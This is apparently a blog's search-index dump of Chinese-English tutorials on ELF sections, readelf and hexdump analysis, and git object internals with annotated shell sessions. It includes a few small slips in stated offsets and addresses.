base address: Runtime Address of _init = `Base` + 0x1000 Runtime Address of main = `Base` + 0x11ed Memory Mapping at Runtime When you run ./demo, the OS maps the .text section into memory with execute permissions:\ncat /proc/self/maps Output (example):\n555555555000-555555556000 r-xp 0x1000 ./demo r-xp: Read + eXecute, not Writable. 0x1000: File offset for .text. 0x1fb: Size of .text (507 bytes). .text 总结 Section Purpose Virtual Address File Offset Size (Bytes) Permissions Notes .text Executable code 0x1080 0x1080 0x1fb (507) r-x Not writable (security) This section is critical for program execution, containing all your compiled functions and runtime initialization code.\n.rodata section 分析 [18] .rodata PROGBITS 0000000000002000 00002000 0000000000000076 0000000000000000 A 0 0 4 .rodata section 字段解释 Field Value Meaning [18] Section index .rodata is the 18th section in the ELF file. .rodata Section name Holds read-only data (constants, string literals, etc.). PROGBITS Section type Data is stored in the file (not dynamically generated). 0000000000002000 Virtual Address (VA) At runtime, this section is mapped to memory address 0x2000 (relative to the randomized PIE base address). 00002000 File Offset In the file (demo), .rodata starts at byte 0x2000 (8192 in decimal). 0000000000000076 Size Size of .rodata section: 0x76 (118 bytes). 0000000000000000 Entry Size (EntSize) Not applicable (no fixed-size entries). A Flags Section is Allocated (loaded into memory). No W or X → read-only. 0 Link Unused for .rodata. 0 Info Unused for .rodata. 4 Alignment Must be aligned to 4-byte boundaries in memory. Purpose of .rodata The .rodata section stores read-only data that doesn’t change during execution:\nString literals: e.g., \"Hello from .rodata!\". Constant variables: e.g., const int x = 42;. Jump tables: Used for switch() statements. Build metadata: e.g., __abi_tag, BuildID. Why Is .rodata Read-Only? Security: Prevents runtime modification of constants (e.g., format strings, lookup tables). Optimization: Shared across processes (e.g., libc’s string constants). Memory Protection: Violations (e.g., writing to .rodata) cause segmentation faults. Memory Mapping at Runtime When the program runs:\nThe OS maps .rodata to virtual address 0x2000 (relative to the randomized base address). .rodata is marked read-only in memory (no write permissions). Example /proc/self/maps output:\n555555556000-555555557000 r--p 0x2000 ./demo r--p: Read-only, not writable or executable. Security Implications NX Bit (No-eXecute):\n.rodata is not executable, preventing code injection. Writable Protection:\nAttempting to modify .rodata at runtime (e.g., via a casted pointer) will crash the program: char *s = (char *)\"Hello from .rodata!\"; s[0] = 'h'; // Will cause a segmentation fault ASLR Compatibility:\n.rodata is part of the randomized memory layout in PIE binaries. Key Takeaways Concept Value Notes Section Type PROGBITS Contains actual data in the file. Virtual Address 0x2000 Runtime address (relative to PIE base). File Offset 0x2000 String \"Hello from .rodata!\" is stored here on disk. Size 0x76 (118 bytes) Total space used by .rodata. Flags A (Allocated) Loaded into memory as read-only. Alignment 4 Must start at a 4-byte aligned address. 查看 demo 中 0x2000(.rodata) 后 0x76(118) 字节的内容 xxd -l 0x76 -s 0x2000 demo 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ....Hello from . 00002010: 726f 6461 7461 2100 436f 756e 7465 723a rodata!.Counter: 00002020: 2025 640a 0046 696e 616c 697a 696e 672e %d..Finalizing. 00002030: 2e2e 0049 6e69 7469 616c 697a 696e 672e ...Initializing. 00002040: 2e2e 0047 6c6f 6261 6c20 4461 7461 3a20 ...Global Data: 00002050: 2564 0a00 476c 6f62 616c 2042 5353 3a20 %d..Global BSS: 00002060: 2564 0a00 4c6f 6361 6c20 5374 6174 6963 %d..Local Static 00002070: 3a20 2564 0a00 : %d.. demo 中 0x2000(.rodata) 后 0x76(118) 字节的内容分析 0x20 space 展示用 @ 代替 0x0a line feed 展示用 # 代替 0x00 null 作为字符串结束标志，展示用 😂 代替 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ....Hello@from@. 00002010: 726f 6461 7461 2100 436f 756e 7465 723a rodata!😂Counter: 00002020: 2025 640a 0046 696e 616c 697a 696e 672e @%d#😂Finalizing. 00002030: 2e2e 0049 6e69 7469 616c 697a 696e 672e ..😂Initializing. 00002040: 2e2e 0047 6c6f 6261 6c20 4461 7461 3a20 ..😂Global@Data:@ 00002050: 2564 0a00 476c 6f62 616c 2042 5353 3a20 %d#😂Global@BSS:@ 00002060: 2564 0a00 4c6f 6361 6c20 5374 6174 6963 %d#😂Local@Static 00002070: 3a20 2564 0a00 :@%d#😂 The .rodata section’s 4-byte alignment ensures that the section itself starts at a 4-byte aligned address in both the file and memory, but individual strings inside it do not need to be 4byte aligned.\nSection Alignment vs. Internal Data Alignment Section Alignment Align: 4 in readelf -S means the .rodata section must start at an address divisible by 4 in memory and in the file. In your file: File Offset: 0x2000 (8192) → divisible by 4 (0x2000 % 4 = 0). In memory: Virtual Address: 0x2000 → also divisible by 4 (0x2000 % 4 = 0). This alignment is enforced for efficient memory access, not for internal strings. Internal Strings Are Packed The compiler places strings sequentially in .rodata without padding between them. Example from your hex dump: 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ __abi_tag \"Hello from .rodata!\\0\" \"Hello from .rodata!\\0\" starts at 0x2004 (after the 4-byte header). Next string \"Global Data: %d\\n\\0\" starts at 0x2018 (no padding between 0x2014 and 0x2018). How Alignment Affects Storage Even though the section is aligned to 4 bytes, the compiler packs strings tightly to save space. Alignment only matters for:\nSection Start: Ensures the entire .rodata section begins at a 4byte boundary. Data Access: If code accesses parts of .rodata as 4byte aligned values (e.g., via pointer arithmetic), the compiler ensures those values are aligned. 修改 message 信息 Hello from .rodata! 修改为 ABCDE from .rodata!\n./update.sh demo 0x2004 0x41 Updated byte at offset 8196 (0x2004) to 0x41 ~/elf-demo$ ./update.sh demo 0x2005 0x42 Updated byte at offset 8197 (0x2005) to 0x42 ~/elf-demo$ ./update.sh demo 0x2006 0x43 Updated byte at offset 8198 (0x2006) to 0x43 ~/elf-demo$ ./update.sh demo 0x2007 0x44 Updated byte at offset 8199 (0x2007) to 0x44 ~/elf-demo$ ./update.sh demo 0x2008 0x45 Updated byte at offset 8200 (0x2008) to 0x45 ~/elf-demo$ ./demo Initializing... Global Data: 42 Global BSS: 0 Local Static: 100 ABCDE from .rodata! # 修改成功🤣 Counter: 1 Counter: 2 Counter: 3 Finalizing... .rodata section 总结 4byte alignment applies to the section itself, not individual strings. __abi_tag adds 4 bytes to .rodata. Null terminators add 7 bytes (1 per string). ","text-section-分析#\u003ccode\u003e.text\u003c/code\u003e section 分析":"","示例代码#示例代码":""},"title":"Master Elf Sections"},"/blog/master-elf/":{"data":{"":"","elf-file-layout#\u003cstrong\u003eELF File Layout\u003c/strong\u003e":"","elf-file-structure#\u003cstrong\u003eELF File Structure\u003c/strong\u003e":"","example-full-flow-for#\u003cstrong\u003eExample: Full Flow for \u003ccode\u003ehello\u003c/code\u003e\u003c/strong\u003e":"hello world #include \u003cstdio.h\u003e int main() { printf(\"hello world\\n\"); } gcc –save-temps -o hello hello.c\nWhat is ELF? ELF (Executable and Linkable Format) is a standardized binary format for storing compiled programs, libraries, and other binaries on Unix-like systems (e.g., Linux). It defines how machine code, data, symbols, relocation information, and metadata are organized in files like:\nExecutables (./hello) Object files (hello.o) Shared libraries (.so) Core dumps ELF File Structure An ELF file has two primary views:\nLinking View (Sections) Used during compilation/linking to combine object files. Contains section headers describing discrete parts of the file. Execution View (Segments) Used at runtime to load the program into memory. Contains program headers mapping sections to memory segments. Key Components Component Purpose ELF Header Metadata about the file (architecture, type, entry point, etc.). Program Headers Describe how to map segments to memory (used by the OS at runtime). Section Headers List all sections (code, data, symbols, relocations, debug info, etc.). Sections Logical units like .text (code), .data (initialized variables), etc. Segments Physical chunks mapped into memory (e.g., LOAD, DYNAMIC, STACK). ELF File Layout +---------------------+ | ELF Header | ← Fixed-size metadata at file offset 0 +---------------------+ | Program Headers | ← Describes segments (for runtime) +---------------------+ | Section 1 (.text) | ← Machine code +---------------------+ | Section 2 (.data) | ← Initialized global/static variables +---------------------+ | ... | +---------------------+ | Section Headers | ← Table listing all sections +---------------------+ Key ELf Concepts ELF Header Use readelf -h hello to see:\nELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Position-Independent Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x1060 Start of program headers: 64 (bytes into file) Start of section headers: 13976 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 13 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 30 Program Headers (Segments) Use readelf -l hello to see:\nElf file type is DYN (Position-Independent Executable file) Entry point 0x1060 There are 13 program headers, starting at offset 64 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 0x00000000000002d8 0x00000000000002d8 R 0x8 INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000628 0x0000000000000628 R 0x1000 LOAD 0x0000000000001000 0x0000000000001000 0x0000000000001000 0x0000000000000175 0x0000000000000175 R E 0x1000 LOAD 0x0000000000002000 0x0000000000002000 0x0000000000002000 0x00000000000000f4 0x00000000000000f4 R 0x1000 LOAD 0x0000000000002db8 0x0000000000003db8 0x0000000000003db8 0x0000000000000258 0x0000000000000260 RW 0x1000 DYNAMIC 0x0000000000002dc8 0x0000000000003dc8 0x0000000000003dc8 0x00000000000001f0 0x00000000000001f0 RW 0x8 NOTE 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 NOTE 0x0000000000000368 0x0000000000000368 0x0000000000000368 0x0000000000000044 0x0000000000000044 R 0x4 GNU_PROPERTY 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 GNU_EH_FRAME 0x0000000000002010 0x0000000000002010 0x0000000000002010 0x0000000000000034 0x0000000000000034 R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000002db8 0x0000000000003db8 0x0000000000003db8 0x0000000000000248 0x0000000000000248 R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 03 .init .plt .plt.got .plt.sec .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .dynamic .got .data .bss 06 .dynamic 07 .note.gnu.property 08 .note.gnu.build-id .note.ABI-tag 09 .note.gnu.property 10 .eh_frame_hdr 11 12 .init_array .fini_array .dynamic .got segment LOAD 理解 Explanation of the Two Lines in the LOAD Segment Here’s a breakdown of the two lines from the LOAD segment in your readelf -l hello output:\nLOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000628 0x0000000000000628 R 0x1000 Line-by-Line Breakdown Field Value Meaning Type LOAD This segment is loaded into memory during execution. Offset 0x0000000000000000 Start of this segment in the file (offset 0 bytes from the file start). VirtAddr 0x0000000000000000 Virtual memory address where this segment is mapped (position-independent; resolved at runtime). PhysAddr 0x0000000000000000 Physical memory address (ignored for executables; used in firmware). FileSiz 0x0000000000000628 (1576 bytes) Size of the segment in the file. MemSiz 0x0000000000000628 (1576 bytes) Size of the segment in memory (same as FileSiz; no zero-filled padding). Flags R Segment is read-only. Align 0x1000 (4096 bytes) Alignment requirement (must be page-aligned in memory). Purpose of This Segment This LOAD segment maps read-only metadata into memory, including:\n.interp: Path to the dynamic linker (/lib64/ld-linux-x86-64.so.2). .note.gnu.build-id: Unique identifier for debugging. .gnu.hash, .dynsym, .dynstr: Dynamic symbol table and hashing for efficient symbol resolution. Relocation tables: Used by the dynamic linker to adjust addresses at runtime. It is critical for dynamic linking and runtime symbol resolution.\nWhy Are VirtAddr and PhysAddr Zero? Position-Independent Executable (PIE):\nThe binary is compiled as DYN (shared object style), allowing the OS to load it at a randomized base address (ASLR). At runtime, the OS chooses a base address (e.g., 0x555555554000), and all segments are mapped relative to this base. VirtAddr = 0 means the segment’s virtual address is calculated as base + offset. Security Implications No Write or Execute Permissions:\nThe R flag ensures this segment is read-only, protecting metadata from tampering. Alignment (0x1000):\nEnsures the segment starts at a page boundary (4KB), satisfying memory protection requirements. Example Mapping in Memory At runtime, the OS maps this segment as follows:\nVirtual Address Range Permissions Purpose [BASE_ADDR] R .interp, .note.gnu.build-id, .gnu.hash, .dynsym, etc. [BASE_ADDR + 0x628] ... Next segment starts here. Key Takeaways Metadata Storage: Contains essential runtime data for dynamic linking. ASLR Compatibility: Position-independent addressing enhances security. Read-Only Protection: Prevents accidental or malicious modification of critical data. Sections Use readelf -S hello to list sections:\nSection Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 [ 1] .text PROGBITS 0000000000401000 00001000 00000000000001b2 0000000000000000 AX 0 0 16 ... .text: Executable code. .rodata: Read-only constants (e.g., strings). .plt/.got: Dynamic linking stubs. .symtab: Symbol table for debugging/linking. How Does ELF Work? Compilation:\nGCC generates an ELF object file (hello.o) with sections like .text, .data, and .symtab. Linking:\nThe linker (ld) merges sections from multiple object files, resolves symbols, and creates an executable ELF file with program headers. Execution:\nThe OS loads the executable using the program headers to map memory regions and execute code. What Does the OS Do When Running ./hello? Here’s the lifecycle from command line to execution:\nUser Runs the Command ./hello The shell calls execve(\"./hello\", ...), which triggers the kernel to load the ELF file.\nKernel Reads the ELF Header Checks the magic number (\\x7fELF) to confirm it’s an ELF file. Parses the ELF header to determine architecture (e.g., x86-64). Kernel Loads Segments into Memory Using the program headers, the kernel:\nMaps .text (code) to executable memory. Maps .data and .bss to writable memory. Sets up the stack and environment variables. If there’s a INTERP segment, loads the dynamic linker (e.g., /lib64/ld-linux-x86-64.so.2). Dynamic Linking (if needed) If the program uses shared libraries:\nThe kernel transfers control to the dynamic linker. The linker resolves dependencies (e.g., libc.so.6), loads libraries, and relocates addresses. Start Execution The kernel jumps to the entry point specified in the ELF header (Entry point address). For C programs, this is typically _start (in crt1.o), which initializes the C runtime, calls main(), and exits cleanly. Example: Full Flow for hello $ gcc -o hello hello.c # Compiles to ELF executable File Type: file hello hello: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce69e228b62365b698bac3bf837cb1c5668a8079, for GNU/Linux 3.2.0, not stripped ldd hello linux-vdso.so.1 (0x00007fffdd6be000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007cdea5a00000) /lib64/ld-linux-x86-64.so.2 (0x00007cdea5db7000) Entry Point: $ readelf -h hello | grep \"Entry point\" Entry point address: 0x1060 Execution Steps: Kernel maps the .text segment to 0x401000. Starts executing _start (assembler boilerplate). Calls __libc_start_main() (glibc initialization). Invokes main() → prints \"Hello, world!\". Returns to the kernel via exit(0). Tools to Inspect ELF Files Tool Purpose readelf Analyze headers, sections, symbols. objdump Disassemble code, view relocations. nm List symbols (functions/variables). gdb Debug and inspect memory layout. strings Extract human-readable strings. Summary Workflow Source Code → gcc -c → ELF Object File (hello.o) Object Files → ld → ELF Executable (hello) OS Loads ELF → Maps Memory Segments → Resolves Dependencies → Executes Code By understanding ELF, you gain insight into how software interacts with hardware, memory, and the operating system at the lowest level.","hello-world#hello world":"","how-does-elf-work#\u003cstrong\u003eHow Does ELF Work?\u003c/strong\u003e":"","key-components#Key Components":"","key-elf-concepts#\u003cstrong\u003eKey ELf Concepts\u003c/strong\u003e":"","references#References":" linkers wiki-linker ","what-does-the-os-do-when-running#\u003cstrong\u003eWhat Does the OS Do When Running \u003ccode\u003e./hello\u003c/code\u003e?\u003c/strong\u003e":"","what-is-elf#\u003cstrong\u003eWhat is ELF?\u003c/strong\u003e":""},"title":"Master Elf"},"/blog/master-git/":{"data":{"":"","fast-forward-merge#Fast-forward Merge":"","git-add--git-commit--git-branch-图解#git add | git commit | git branch 图解":"","git-branch#git branch":"","git-init#git init":"","reference#Reference":"git init Create an empty Git repository or reinitialize an existing one 也即是向 working directory 里添加 .git 文件夹\n.git/ ├── branches # git 分支 ├── config # git 配置 ├── description ├── HEAD # HEAD 指针, 指向当前分支最新的 commit ├── hooks │ ├── applypatch-msg.sample │ ├── commit-msg.sample │ ├── fsmonitor-watchman.sample │ ├── post-update.sample │ ├── pre-applypatch.sample │ ├── pre-commit.sample │ ├── prepare-commit-msg.sample │ ├── pre-push.sample │ ├── pre-rebase.sample │ ├── pre-receive.sample │ └── update.sample ├── info │ └── exclude ├── objects # 存放不同种类的 git 对象，实现版本管理的关键 │ ├── info │ └── pack └── refs ├── heads └── tags # git 标签 第一次 git add | git commit git add Add file contents to the index 添加文件内容到 index 区\n添加两个文件 file1 和 file2, 文件内容分别是 111 和 222\ngit add file_name\ngit add file1 tree .git/objects 查看添加的 git object .git/objects/ ├── 58 │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c ├── info └── pack 对 file1 文件内容也就是 111 和一些其他的信息做 SHA-1 运算得出 58c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c 这个 40 位 16 进制的值.\ngit cat-file 查看 objects 相关信息 查看 object 类型 git cat-file -t 58c9bd blob 查看 object 大小\ngit cat-file -s 58c9bd 4 查看 object 内容\ngit cat-file -p 58c9bd 111 对文件内容为 222 的 file2 进行步骤 2 ~ 4. 查看 .git/objects 如下:\n.git/objects/ ├── 58 │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c # file1:blob ├── c2 │ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c # file2:blob ├── info └── pack git commit Stores the current contents of the index in a new commit along with a log message from the user describing the changes. A commit in a git repository records a snapshot of all the files in your directory.\n执行 git commit -m “add file1 and file2” 查看 .git/objects 的变化 tree .git/objects .git/objects/ ├── 58 │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c # file1:blob ├── 73 │ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5 # 1:commit ├── c2 │ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c # file2:blob ├── d9 │ └── 64f468f776fac72a049a884ae24e7dbb838fd0 # 1:tree ├── info └── pack 查看 HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/master # 目前在 master 分支上 root@aliyun:~/blog# cat .git/refs/heads/master 73622e96d5b5389d63dd74e3c40db9d4c4296ff5 # 1:commit 第二次 git add | git commit 修改 file1 的文件内容为 333\ngit add file1 root@aliyun:~/blog# git add file1 root@aliyun:~/blog# tree .git/objects/ .git/objects/ ├── 55 │ └── bd0ac4c42e46cd751eb7405e12a35e61425550 # file1_modify: blob ├── 58 │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c ├── 73 │ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5 ├── c2 │ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c ├── d9 │ └── 64f468f776fac72a049a884ae24e7dbb838fd0 ├── info └── pack git commit -m “modify file1” root@aliyun:~/blog# git commit -m \"modify file1\" [master 558e28c] modify file1 1 file changed, 1 insertion(+), 1 deletion(-) root@aliyun:~/blog# tree .git/objects/ .git/objects/ ├── 55 │ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e # 2:commit │ └── bd0ac4c42e46cd751eb7405e12a35e61425550 # file1_modify: blob ├── 58 │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c ├── 61 │ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 # 2:tree ├── 73 │ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5 ├── c2 │ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c ├── d9 │ └── 64f468f776fac72a049a884ae24e7dbb838fd0 ├── info └── pack 查看 HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/master root@aliyun:~/blog# cat .git/refs/heads/master 558e28c67089eea9bdfbfd748d32baa8f2ce944e # 指向了第二次 commit 的 hash 值 git add | git commit 实质 git add: 向 .git/objects 添加类型是 blob 的文件 git commit: 向 .git/objects 添加类型是 tree 和 commit 的文件\ngit branch List, create, or delete branches Branches in Git are incredibly lightweight as well. They are simply pointers to a specific commit – nothing more. 仅仅是添加了一个指向特定 commit 的指针。 a branch essentially says “I want to include the work of this commit and all parent commits.” 一个分支就是我想要这个 commit 以及这个 commit 的所有 parent commits\n创建一个 new-branch 的分支 root@aliyun:~/blog# git branch new-branch root@aliyun:~/blog# tree .git/ .git/ ├── branches ├── COMMIT_EDITMSG ├── config ├── description ├── HEAD ├── hooks │ ├── applypatch-msg.sample │ ├── commit-msg.sample │ ├── fsmonitor-watchman.sample │ ├── post-update.sample │ ├── pre-applypatch.sample │ ├── pre-commit.sample │ ├── prepare-commit-msg.sample │ ├── pre-push.sample │ ├── pre-rebase.sample │ ├── pre-receive.sample │ └── update.sample ├── index ├── info │ └── exclude ├── logs │ ├── HEAD │ └── refs │ └── heads │ ├── master │ └── new-branch # git branch new-branch 添加的分支日志 ├── objects │ ├── 55 │ │ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e │ │ └── bd0ac4c42e46cd751eb7405e12a35e61425550 │ ├── 58 │ │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c │ ├── 61 │ │ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 │ ├── 73 │ │ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5 │ ├── c2 │ │ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c │ ├── d9 │ │ └── 64f468f776fac72a049a884ae24e7dbb838fd0 │ ├── info │ └── pack └── refs ├── heads │ ├── master │ └── new-branch # git branch new-branch 添加的 refs └── tags 18 directories, 29 files git branch - -list 查看分支 root@aliyun:~/blog# git branch --list * master # * 表示当前所在分支 new-branch # 新创建的 new-branch 分支 git checkout new-branch 切换分支 root@aliyun:~/blog# git checkout new-branch Switched to branch 'new-branch' root@aliyun:~/blog# git branch --list master * new-branch 创建分支 new-branch, 并切换到 new-branch 分支.\ngit branch new-branch git checkout new-branch 可以简化为: git checkout -b new-branch 查看 HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/new-branch root@aliyun:~/blog# cat .git/refs/heads/new-branch 558e28c67089eea9bdfbfd748d32baa8f2ce944e # 指向了第二次 commit 的 hash值 由此可知 git branch new-branch 创建一个分支,实际上做了两件事情:\n添加 .git/logs/refs/heads/new-branch 记录该分支的 log 添加 .git/refs/heads/new-branch 指向最新的 commit 这也就是 git 创建新的分支如此快的原因. 第三次 git add | git commit 切换到 new-branch 分支, 新建一个 file3 的文件, 内容是 new-branch-file3\ngit add file3 root@aliyun:~/blog# git add file3 root@aliyun:~/blog# tree .git/objects/ .git/objects/ ├── 2e │ └── 799a48d8c045b814c3862af40dea98bdde790a # file3 ├── 55 │ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e │ └── bd0ac4c42e46cd751eb7405e12a35e61425550 ├── 58 │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c ├── 61 │ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 ├── 73 │ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5 ├── c2 │ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c ├── d9 │ └── 64f468f776fac72a049a884ae24e7dbb838fd0 ├── info └── pack 9 directories, 8 files root@aliyun:~/blog# git cat-file -t 2e79 blob root@aliyun:~/blog# git cat-file -p 2e79 new-branch-file3 root@aliyun:~/blog# git cat-file -s 2e79 17 git commit -m “file3 on new-branch” root@aliyun:~/blog# git commit -m \"add file3 on new-branch\" [new-branch ce907fa] add file3 on new-branch 1 file changed, 1 insertion(+) create mode 100644 file3 root@aliyun:~/blog# tree .git/objects/ .git/objects/ ├── 2e │ └── 799a48d8c045b814c3862af40dea98bdde790a ├── 55 │ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e │ └── bd0ac4c42e46cd751eb7405e12a35e61425550 ├── 58 │ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c ├── 61 │ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 ├── 73 │ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5 ├── b7 │ └── 2118da210e8e3f4127cfc16cc819eff58e42e3 # new-branch:tree ├── c2 │ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c ├── ce │ └── 907fabd08138058b05428d7cac017507b33c44 # new-branch:commit ├── d9 │ └── 64f468f776fac72a049a884ae24e7dbb838fd0 ├── info └── pack 11 directories, 10 files root@aliyun:~/blog# git cat-file -t b721 tree root@aliyun:~/blog# git cat-file -p b721 # 全量的快照(snapshot) 100644 blob 55bd0ac4c42e46cd751eb7405e12a35e61425550 file1 100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3 root@aliyun:~/blog# git cat-file -s b721 99 root@aliyun:~/blog# git cat-file -t ce90 commit root@aliyun:~/blog# git cat-file -p ce90 tree b72118da210e8e3f4127cfc16cc819eff58e42e3 parent 558e28c67089eea9bdfbfd748d32baa8f2ce944e # 上一次 commit author root \u003croot@aliyun\u003e 1578039532 +0800 committer root \u003croot@aliyun\u003e 1578039532 +0800 add file3 on new-branch # commit message root@aliyun:~/blog# git cat-file -s ce90 208 查看 HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/new-branch # 当前在 new-branch 分支上 root@aliyun:~/blog# cat .git/refs/heads/new-branch ce907fabd08138058b05428d7cac017507b33c44 # new-branch 分支最新的提交 切换到 master 分支查看 HEAD root@aliyun:~/blog# git checkout master Switched to branch 'master' root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/master # 当前在 master 分支 root@aliyun:~/blog# cat .git/refs/heads/master 558e28c67089eea9bdfbfd748d32baa8f2ce944e # master 分支最新的提交 查看 master 和 new-branch 两个分支可知, 每一分支对应的 HEAD 和 .git/refs/heads/branch_name 记录的 commit 不同. 这就是 git 分支的实现.\ngit add | git commit | git branch 图解 Fast-forward Merge 两次 git add 和 git commit 之后，创建 new-branch ，在 new-branch 进行了修改。 但是 master 分支没有做任何更改。也就是 master 此时分支落后了 new-branch 分支。 new-branch 分支的修改 master 分支怎样看到呢？可以进行所谓的 Fast-forward merge。\n切换到 master 分支 root@aliyun:~/blog# git checkout master # 切换到 master 分支\rSwitched to branch 'master'\rroot@aliyun:~/blog# cat .git/refs/heads/master # master 分支仍然指向第二次的 commit。\r558e28c67089eea9bdfbfd748d32baa8f2ce944e\rroot@aliyun:~/blog# tree .git/objects/ # 查看 objects 对象。\r.git/objects/\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── info\r└── pack\r11 directories, 10 files 合并 new-branch 分支到 master 分支 root@aliyun:~/blog# git merge new-branch # 合并 new-branch 分支\rUpdating 558e28c..ce907fa ### 更新 558e 这个object\rFast-forward # fast-forward\rfile3 | 1 +\r1 file changed, 1 insertion(+)\rcreate mode 100644 file3\rroot@aliyun:~/blog# ls\rfile1 file2 file3\rroot@aliyun:~/blog# tree .git/objects/ # 查看 objects 对象。并没增加任何 object\r.git/objects/\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 622e96d5b5389d63dd74e3c40db9d4c4296ff5\r├── b7\r│ └── 2118da210e8e3f4127cfc16cc819eff58e42e3\r├── c2\r│ └── 00906efd24ec5e783bee7f23b5d7c941b0c12c\r├── ce\r│ └── 907fabd08138058b05428d7cac017507b33c44\r├── d9\r│ └── 64f468f776fac72a049a884ae24e7dbb838fd0\r├── info\r└── pack\r11 directories, 10 files\rroot@aliyun:~/blog# cat .git/refs/heads/master ce907fabd08138058b05428d7cac017507b33c44 # 更新了 master 指向，指向了 new-branch 的 commit。 Fast-Forward 图解 删除 master 分支上的 file1 文件，然后提交 root@aliyun:~# cp -r blog blog-delete # 复制一份，在 master 分支上删除 file1\rroot@aliyun:~# cd blog-delete/\rroot@aliyun:~/blog-delete# ls\rfile1 file2 file3\rroot@aliyun:~/blog-delete# tree .git/objects/ # 删除前的 git objects\r.git/objects/\r├── 2e\r│ └── 799a48d8c045b814c3862af40dea98bdde790a\r├── 55\r│ ├── 8e28c67089eea9bdfbfd748d32baa8f2ce944e\r│ └── bd0ac4c42e46cd751eb7405e12a35e61425550\r├── 58\r│ └── c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\r├── 61\r│ └── 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\r├── 73\r│ └── 